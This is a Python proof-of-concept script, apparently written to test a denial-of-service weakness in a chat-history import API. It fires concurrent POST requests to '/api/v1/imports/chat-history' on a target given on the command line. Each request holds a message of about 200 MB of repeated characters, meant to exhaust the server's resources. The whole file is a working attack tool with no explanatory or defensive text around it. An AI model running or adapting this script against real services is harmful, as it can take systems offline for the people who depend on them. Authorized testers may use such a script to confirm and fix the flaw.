import concurrent.futures
import json
import sys
import time
import urllib.request


target = sys.argv[1].rstrip("/")
size = int(sys.argv[2]) if len(sys.argv) > 2 else 200 * 1024 * 1024
concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 12
requests = int(sys.argv[4]) if len(sys.argv) > 4 else 12


def send_import(i):
    payload = {
        "source": "codex",
        "sessions": [
            {
                "external_id": f"poc-{int(time.time())}-{i}",
                "title": "poc",
                "source_cwd": "",
                "created_at": time.time(),
                "updated_at": time.time(),
                "messages": [
                    {
                        "role": "user",
                        "content": "A" * size,
                        "created_at": time.time(),
                        "metadata": {},
                    }
                ],
            }
        ],
    }
    req = urllib.request.Request(
        target + "/api/v1/imports/chat-history",
        data=json.dumps(payload).encode(),
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        urllib.request.urlopen(req, timeout=120).read()
        return 200
    except Exception as e:
        return type(e).__name__


with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
    for idx, result in enumerate(pool.map(send_import, range(requests)), 1):
        print(idx, result)
